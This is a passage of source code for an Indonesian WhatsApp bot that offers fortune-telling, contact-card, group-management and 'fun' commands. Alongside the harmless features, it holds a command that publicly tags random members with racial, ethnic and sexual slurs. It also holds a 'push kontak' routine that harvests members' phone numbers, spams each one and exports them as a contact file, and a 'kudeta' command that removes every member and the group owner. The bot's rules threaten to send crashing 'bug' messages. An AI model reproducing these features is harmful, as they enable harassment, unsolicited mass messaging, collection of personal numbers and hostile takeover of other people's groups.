 if (anu.status == false) return reply(anu.message)
 znn.sendteks(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
}
break
//=================================================//
case 'rejeki': case 'rezeki': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 znn.sendteks(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'pekerjaan': case 'kerja': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 znn.sendteks(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.ramalan_nasib(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 znn.sendteks(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
}
break
//=================================================//

case 'potensipenyakit': case 'penyakit': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 znn.sendteks(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artitarot': case 'tarot': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 znn.sendImage(from, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'fengshui': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} HW MODS WA, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
 let [nama, gender, tahun] = text.split`,`
 let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
 if (anu.status == false) return reply(anu.message)
 znn.sendteks(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}
break
//=================================================//
case 'haribaik': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.petung_hari_baik(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 znn.sendteks(from, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harisangar': case 'taliwangke': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 znn.sendteks(from, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harinaas': case 'harisial': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 znn.sendteks(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
}
break
//=================================================//
case 'nagahari': case 'harinaga': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 znn.sendteks(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'arahrejeki': case 'arahrezeki': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 znn.sendteks(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'peruntungan': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} Aruna, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
 let [nama, tgl, bln, thn, untuk] = text.split`,`
 let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
 if (anu.status == false) return reply(anu.message)
 znn.sendteks(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'weton': case 'wetonjawa': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.weton_jawa(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 znn.sendteks(from, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
}
break
//=================================================//
case 'sifat': case 'karakter': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} HW MODS WA, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 znn.sendteks(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
}
break
//=================================================//
case 'keberuntungan': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} HW MODS WA, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 znn.sendteks(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
}
break
//=================================================//
case 'memancing': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 znn.sendteks(from, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'masasubur': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
 let [tgl, bln, thn, siklus] = text.split`,`
 let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
 if (anu.status == false) return reply(anu.message)
 znn.sendteks(from, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'zodiak': case 'zodiac': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix+ command} 7 7 2005`
 let zodiak = [
 ["capricorn", new Date(1970, 0, 1)],
 ["aquarius", new Date(1970, 0, 20)],
 ["pisces", new Date(1970, 1, 19)],
 ["aries", new Date(1970, 2, 21)],
 ["taurus", new Date(1970, 3, 21)],
 ["gemini", new Date(1970, 4, 21)],
 ["cancer", new Date(1970, 5, 22)],
 ["leo", new Date(1970, 6, 23)],
 ["virgo", new Date(1970, 7, 23)],
 ["libra", new Date(1970, 8, 23)],
 ["scorpio", new Date(1970, 9, 23)],
 ["sagittarius", new Date(1970, 10, 22)],
 ["capricorn", new Date(1970, 11, 22)]
 ].reverse()

 function getZodiac(month, day) {
 let d = new Date(1970, month - 1, day)
 return zodiak.find(([_,_d]) => d >= _d)[0]
 }
 let date = new Date(text)
 if (date == 'Invalid Date') throw date
 let d = new Date()
 let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
 let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
 let zodiac = await getZodiac(birth[1], birth[2])
 let anu = await primbon.zodiak(zodiac)
 if (anu.status == false) return reply(anu.message)
 znn.sendteks(from, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'shio': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
 let anu = await primbon.shio(text)
 if (anu.status == false) return reply(anu.message)
 znn.sendteks(from, `⭔ *Hasil :* ${anu.message}`, m)
}
break
























































// FITUR FUN

case 'tolol':
case 'goblog':
case 'goblok':
case 'idiot':
case 'gay':
case 'jomok':
case 'bajingan':
case 'munafik':
case 'kontol':
case 'yatim':
case 'poke':
case 'pembokep':
case 'hitam':
case 'jawa':
case 'wibu':
case 'stress':
case 'miskin':
case 'cantik':
case 'manis':
case 'babi':
case 'ganteng':
case 'cina':
case 'atheis':
case 'papua':
case 'nigga':
case 'pengentot':
case 'seksi':
case 'kawai':
case 'tercindo':
case 'fembokef':
case 'pengocok':
case 'cabul':
case 'fuckboy':
case 'playboy':
case 'sange':
case 'sangean':
case 'hot': {
if (!isGroup) return onlyGroup()
let member = participants.map((u) => u.id)
let org = member[Math.floor(Math.random() * member.length)]
znn.sendMessage(m.chat,
{ text: `Orang ${command} disini adalah @${org.split('@')[0]}`,
contextInfo:{
mentionedJid:[org],
isForwarded: false, 
"externalAdReply": {
"showAdAttribution": false,
"containsAutoReply": true,
"title": `${command} yang di tag`,
"body": `hanya hiburan (ー_ー゛)`,
"previewType": "PHOTO",
"thumbnail": ppnyauser,
"sourceUrl": `${global.saluran}`}}},
{ quoted: m})
}
break

















 























































// FITUR GROUP
case 'listonline':
case 'liston': {
if (!m.isGroup) reply(mess.group)
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
let online = [...Object.keys(store.presences[id]), botNumber]
znn.sendText(m.chat, '乂 *LIST ONLINE:*\n\n' + online.map(v => '◦ @' + v.replace(/@.+/, '')).join`\n`, m, {
mentions: online
})
}
break
case 'sendcontact': case 'sencontact': {
if (!m.isGroup) return reply(mess.group)
if (!m.mentionedJid[0]) return reply795('Gunakan dengan cara\n Example : .sendcontact @tag|name')
let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let snContact = {
	displayName: znn.getName(froms), contacts: [{displayName: znn.getName(froms), vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+znn.getName(froms)+";;;\nFN:"+znn.getName(froms)+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
znn.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
}
break
case 'contacttag': case 'contag':{
if (!m.isGroup) return reply(mess.group)
if (!m.mentionedJid[0]) return reply795('Gunakan dengan cara\n Example : .contacttag @tag|name')
let sngTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let sngContact = {
	displayName: znn.getName(froms), contacts: [{displayName: znn.getName(froms), vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+znn.getName(froms)+";;;\nFN:"+znn.getName(froms)+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
znn.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400})
}
break
case "pushkontakfrom":{
if (!isCreator&&!botNumber) return reply('khusus pengguna bot saja')
if (!isGc) return reply(mess.group + `\n\nUntuk Memasukan Bot Ke Dalam Group Yang Di Ingin Kan\nSilahkan Ketik Command .join linkgroup`)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)

const groupMetadata = isGc? await znn.groupMetadata(from).catch(e => {}) : ""
const groupOwner = isGc? groupMetadata.owner : ""
const participantts = isGc? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
const mess = `Pesan Push Kontak Sedang Di Kirim ke ${halsss.length} Orang\nSelama ${halsss.length * 7} detik\n\n harap untuk tidak melakukan chat saat pushkontak sedang berlangsung!`
await znn.sendMessage(from, {text:mess},{quoted:m})
await znn.sendMessage(owner, {text:mess},{quoted:m})
global.tekspushkonv2 = text

if (isContacts) return
for (let men of halsss) {
contacts.push(men)
fs.writeFileSync('./database/contact/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await znn.downloadAndSaveMediaMessage(quoted)
mem = await global.telegraPH(media)
await znn.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
await delay(7000)
} else {
var contact = generateWAMessageFromContent(men, proto.Message.fromObject({
"contactMessage": {
"displayName": `Push Kontak`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Push Kontak znn\nFN:${pushname}\nitem1.TITLE:Kontak ${pushname}\nURL:znnchat.chatango.com\nitem496.TEL;waid=${nomore}:${pushname}\nitem496.X-ABLabel:Save nomor saya\nX-WA-BIZ-DESCRIPTION:Developer\nEND:VCARD`,
}
}), { userJid: men})
znn.relayMessage(men, contact.message, { messageId: contact.key.id })
await delay(7000)
znn.sendMessage(men, {text: text})
await delay(7000)
}
}
const mess2 = `Sekarang Tinggal Ketik *.savekontak* Nanti Muncul *File* Pencet Aja Terus Impor pakai apk kontak bawaan ya!`
await znn.sendMessage(from, {text:mess2},{quoted:m})
await znn.sendMessage(owner, {text:mess2},{quoted:m})
}
break //Powered By znn & znn
case "savekontak": {
if (!isCreator&&!isPremium) return reply(mess.OnlyPrem)
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:PUSH ${index} ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./database/contact/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await znn.sendMessage(from, { document: fs.readFileSync("./cloneBot/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./cloneBot/database/contacts.json", JSON.stringify(contacts))
}
}
break //Powered By znn & znn
case 'diffusion': case 'stabledif': case 'diff':{
if (!isCreator&&!isPremium) return reply(mess.OnlyPrem)
if (!text) throw `Masukan Promptnya\nExample:\n ${prefix+command} ultra realistic close up portrait ((beautiful pale cyberpunk female with heavy black eyeliner)), blue eyes, shaved side haircut, hyper detail, cinematic lighting, magic neon, dark red city, Canon EOS R3, nikon, f/1.4, ISO 200, 1/160s, 8K, RAW, unedited, symmetrical balance, in-frame, 8K`
reply(mess.wait)

let anu = await diff(text)
let hasil = await processing(anu, "enhance");
znn.sendMessage(m.chat, {image: hasil, caption: `Prompt: ${text}`})
}
break
case "kudeta":{
  if (!isGroup) return reply(mess.group)
if (!isAdmins && !isCreator) return onlyAdmin()
if (!isBotAdmins) return botAdmin()
reply('*[ Alert ]* this group has kudeta')
let memb = participants.map((x) => x.id)
let data = participants.map((x) => x.id)
for (let x of data) {
if (x !== botNumber && x !== groupOwner && x !== global.owner) {
znn.groupParticipantsUpdate(m.chat, [x], "remove")
} else if (data.includes(groupOwner)) {
setTimeout(() => {
znn.groupParticipantsUpdate(m.chat, [groupOwner], "remove")
}, 1) 
znn.groupParticipantsUpdate(m.chat, [groupOwner], "demote")
}}}
break
case 'myip':
            case 'ipbot':
                if (!isCreator) return reply('not for NPC')
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        reply("🔎 My public IP address is: " + ip);
                    })
                })
            break
        case 'cekasalmember': {
  if (!isGroup) return reply(mess.group)
  const participants = await znn.groupMetadata(m.chat).then(metadata => metadata.participants);
  let countIndonesia = 0;
  let countMalaysia = 0;
  let countUSA = 0;
  let countOther = 0;
  
  participants.forEach(participant => {
    const phoneNumber = participant.id.split('@')[0];
    if (phoneNumber.startsWith("62")) {
      countIndonesia++;
    } else if (phoneNumber.startsWith("60")) {
      countMalaysia++;
    } else if (phoneNumber.startsWith("1")) {
      countUSA++;
    } else if (phoneNumber.startsWith("+1")) {
      countOther++;
    } else {
      countOther++;
    }
  });
  
  const replyMessage = `Jumlah Anggota Grup Berdasarkan Negara:\n\nAnggota Indonesia: ${countIndonesia} 🇮🇩\nAnggota Malaysia: ${countMalaysia} 🇲🇾\nAnggota USA + OTHER : ${countUSA} 🇺🇲\nAnggota Negara Lain: ${countOther} 🏳️`;
  reply(replyMessage);
  break;}
case "couple": case"ppcp":{
let anu = await fetchJson("https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json")
reply(mess.wait)
let random = anu[Math.floor(Math.random() * anu.length)]
znn.sendMessage(m.chat,{image: {url: random.male,},caption: `Couple Male`,},{quoted: m,})
znn.sendMessage(m.chat,{image: {url: random.female,},caption: `Couple Female`,},{quoted: m,})
}
break
case 'demoteall':{
if (!isCreator && !isOwner) return onlyOwner()
reply(global.mess.wait)
let data = groupAdmins.splice(botNumber, groupAdmins.length - 1)
await znn.groupParticipantsUpdate(m.chat, data, 'demote')
}
break
case 'leagueid': case 'idbahasa': case 'kodebahasa':{
let LANGUAGES = `
   *❲ COUNTRY ID ❳*
      af: Afrikaans 
      sq: Albanian
      ar: Arabic
      hy: Armenian
      ca: Catalan 
      zh: Chinese 
      zh-cn: Chinese (Mandarin/China)
      zh-tw: Chinese (Mandarin/Taiwan)
      zh-yue: Chinese (Cantonese)
      hr: Croatian
      cs: Czech
      da: Danish
      nl: Dutch
      en: English    
      en-au: English (Australia)
      en-uk: English (United Kingdom)
      en-us: English (United States) 
      eo: Esperanto 
      fi: Finnish 
      fr: French
      de: German
      el: Greek 
      ht: Haitian Creole 
      hi: Hindi 
      hu: Hungarian 
      is: Icelandic 
      id: Indonesian 
      it: Italian
      ja: Japanese
      ko: Korean
      la: Latin
      lv: Latvian
      mk: Macedonian
      no: Norwegian
      pl: Polish
      pt: Portuguese
      pt-br: Portuguese (Brazil)
      ro: Romanian
      ru: Russian
      sr: Serbian
      sk: Slovak
      es: Spanish 
      es-es: Spanish (Spain)
      es-us: Spanish (United States)
      sw: Swahili
      sv: Swedish
      ta: Tamil
      th: Thai
      tr: Turkish
      vi: Vietnamese 
      cy: Welsh
	  *╰────────────⦁*`
sendres(from, LANGUAGES)
}
break
case 'rules':{
if (!isGroup) return onlyGroup()
let teks =`
Syarat dan Ketentuan menggunakan *znn*

*1.* Nama dan nomer user bot *znn*
akan Kami simpan di dalam
server selama bot aktif

*2.* Data akan di hapus ketika bot Offline
atau di hapus oleh Owner Bot

*3.* Kami tidak menyimpan gambar,
video, file, audio, dan dokumen
yang kamu kirim ke *znn*

*4.* Kami tidak akan pernah meminta users
untuk memberikan informasi pribadi

*5.* Jika menemukan Bug/Error silahkan
langsung lapor ke Owner atau Developer

*6.* Beberapa fitur mungkin ada yang error,
jadi tunggu sampai developer
meperbaiki fitur tersebut

*7.* Jika terjadi error harap segera lapor
ke developer/devloper dengan cara ketik
*Report* lalu reply error tersebut

*8.* User dilarang keras menelpon bot!
jika melanggar maka kamu akan terkena
banned,block dan dikirim bug

*9.* Bot tidak akan menanggapi user yang
meminta untuk di save nomornya`
znn.relayMessage(from, { liveLocationMessage: { 
degreesLatitude: -7.2678119,
degreesLongitude: 107.81886705,
caption : teks,
sequenceNumber: 1709322015967001, timeOffset: 8600, jpegThumbnail: null,
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
containsAutoReply: true,
showAdAttribution: false,
}
}
}
}, { quoted: fkontak2 })
}
break
case 'afk': {
if (!isGroup) return onlyGroup()
let user = global.db.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
reply795(`${tag} telah *Afk* dengan alasan ${text ? ': ' + text : ''}`)
}
break
case 'addcmd': case 'setcmd':{
if (!isGroup) return onlyGroup()
if (isQuotedSticker) return reply('Reply stikernya')
if (!text) return reply(`Untuk command apa?`)
let hash = m.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
if (stickercmd[hash]) return reply(`Stiker tersebut udah ada cmd!`)
stickercmd[hash] = {
text: text, 
creator: m.sender
}
znn.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
}
break
case 'delcmd':{
if (isQuotedSticker) return reply('Reply stikernya')
let hash = m.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
if (!stickercmd[hash]) return reply(`Stiker tersebut tidak ada cmd!`)
delete stickercmd[hash]
znn.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
}
break
case 'listcmd':
var data = Object.entries(stickercmd)
if (data.length == 0) return m.reply('*Empty data.*')
var teks = `乂  *LIST STICKER CMD*\n`
teks += data.map(([key, v], index) => `\n${index++}. ${v.text}\n◦  Creator: @${v.creator.split('@')[0]}`).join('\n')
reply(teks)
break
case 'z': case 'hidetag':
if (!isCreator && !isOwner && !isPremium)
if (!text) return reply(`Teks?`)
znn.sendMessage(m.chat, { text : text ? text : '' , mentions: participants.map(a => a.id)}, { quoted: m })
break

case 'joingc': case'join': {
if (!isCreator) return reply('[ System Notice ] Access Deny')
if (!text) return reply(`Kirim perintah ${prefix + command} linkgrup`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.error.Iv)
reply('Proses Bergabung...')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await znn.groupAcceptInvite(result).then((res) => reply('berhasil')).catch((err) => reply('berhasil'))
}
break
case 'leavegc': {
if (!isCreator) return reply('[ System Notice ] Access Deny')
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return onlyAdmin()
if (!isBotAdmins) return botAdmin()
await znn.groupLeave(m.chat).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'owner':
let pp = await znn.profilePictureUrl(`${nomore}@s.whatsapp.net`, 'image').catch((_) => "https://telegra.ph/file/1ecdb5a0aee62ef17d7fc.jpg");
let soond = await getBuffer('https://telegra.ph/file/b4082cd207d7e88c34eaf.jpg')
let ntahlahh9 = `./assets/audio/IMLEK.mp3`
znn.sendkontak(from, '𝙳𝙰𝚁𝚆𝙸𝙽', [['𝙳𝙰𝚁𝚆𝙸𝙽', `${global.owner2}`, 'Pemula Kok']], m, { contextInfo: { externalAdReply: {  title: '𝚁𝙴𝙰𝙻 𝙳𝙴𝙲𝙾𝙳𝙴𝚁', body: '𝙳𝙾𝙽𝚃 𝚂𝙿𝙰𝙼 𝚂𝙸𝚂 ✆', text: 'Pemula Kok', caption: 'Save Nomor Wiwin Ya 😐', description: 'Save Nomor Wiwin Ya 😐', thumbnailUrl: pp, sourceUrl: `https://wa.me/${global.owner2}`, mediaType: 1, showAdAttribution: false, renderLargerThumbnail: true }}},{quoted: fpayment2})
znn.sendMessage(from, { audio: fs.readFileSync(ntahlahh9), mimetype: 'audio/mp4', ptt: false, contextInfo:{  externalAdReply: { showAdAttribution: false,
mediaType:  1,
mediaUrl: `https://wa.me/${global.owner2}`,
title: `Dont Spam Deck`,
body: 'dj dulu wak, eak ewe ewe',
sourceUrl: `https://ẉ.ceo/znn'`, 
thumbnail: ppnyauser,
renderLargerThumbnail: false,
}
}})
break
case "kontakme":{
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `Powered By znn`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Tap Disini\nFN:Owner ${pushname}\nitem1.TITLE:Kontak ${pushname}\nURL:znnchat.chatango.com\nitem496.TEL;waid=${nomore}:owner\nitem496.X-ABLabel:Owner\nitem496.TEL;waid=${botNumber.split('@')[0]}:Bot\nitem496.X-ABLabel:Bot\nX-WA-BIZ-DESCRIPTION:Developer\nEND:VCARD`,
}
}), { userJid: m.chat, quoted: "" })
znn.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
}
break
case 'getname':
if (!isGroup) return onlyGroup()
if (!isBotAdmins) return botAdmin()
if (m.quoted || q) {
if (froms in db.users) {reply(`${db.users[froms].name}`)} else {reply(`${await znn.getName(froms)}`)}
} else reply('Tag atau reply pesan target!')
break //Powered By znn & znn
case 'delsession':
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return onlyAdmin()
if (!isBotAdmins) return botAdmin()
break // Powered By Winn
case 'getpp':
if (m.quoted || q) {
let pporang = await znn.profilePictureUrl(froms, 'image').catch(_ => reply('Profile di private!'))
if (pporang) return znn.sendMessage(from, {image: {url:pporang}, caption: 'Nih!'}, {quoted:m})
} else reply('Tag atau reply pesan target!')
break //Powered By znn & znn
case 'setnamabot': case 'setnamebot': {
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return onlyAdmin()
if (!isBotAdmins) return botAdmin()
if (!text) throw `Example : ${prefix + command} WhatsApp ✅`
let name = await znn.updateProfileName(text)
reply(`Successfully renamed`)
}
break //Powered By znn & znn
case 'setstatus': case 'setbiobot': case 'setbotbio': {
if (!isCreator) return onlyGroup()
if (!text) throw `this is a WhatsApp Bot named znn Bod`
let name = await znn.updateProfileStatus(text)
reply(`Successfully changed bot bio`)
}
break //Powered By znn & znn
case 'getbio':
if (!isGroup) return onlyGroup()
if (m.quoted || q) {
let biou = (await znn.fetchStatus(froms).catch(err => console.log(chalk.redBright('[ ERROR ]'), chalk.whiteBright(err))) || {}).status || 'Bio di private!'
reply(biou)
} else reply('Tag atau reply pesan target!')
break //Powered By znn & znn
case 'd': case 'del': case 'delete': case 'hapus':
if (!m.quoted) return reply('Reply pesan yang ingin dihapus!')
znn.sendMessage(from, {delete: {remoteJid: from, id: m.quoted.id, fromMe: m.quoted.fromMe, participant: m.quoted.sender }})
break //Powered By znn & znn
case'promoteall':
if (!isCreator) return m.reply('Only Creator...')
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return onlyAdmin()
if (!isBotAdmins) return botAdmin()
var groupe = await znn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
